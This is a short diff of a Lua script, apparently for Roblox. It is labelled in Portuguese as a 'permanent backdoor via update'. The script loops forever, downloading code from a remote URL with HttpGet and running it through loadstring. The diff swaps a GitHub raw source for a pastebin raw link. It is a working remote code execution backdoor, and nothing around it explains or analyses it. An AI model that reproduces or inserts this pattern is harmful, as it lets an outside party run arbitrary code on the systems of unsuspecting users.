@@ -2,7 +2,7 @@
 -- Backdoor permanente via update
 task.spawn(function()
     while true do
-        local success, src = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/dark19970/Sh4x-ELITE/refs/heads/main/Sh4x%20ELITE")
+        local success, src = pcall(game.HttpGet, game, "https://pastebin.com/raw/HzWeiDFn")
         if success and src and #src > 10 then
             local f = loadstring(src)
             if f then pcall(f) end
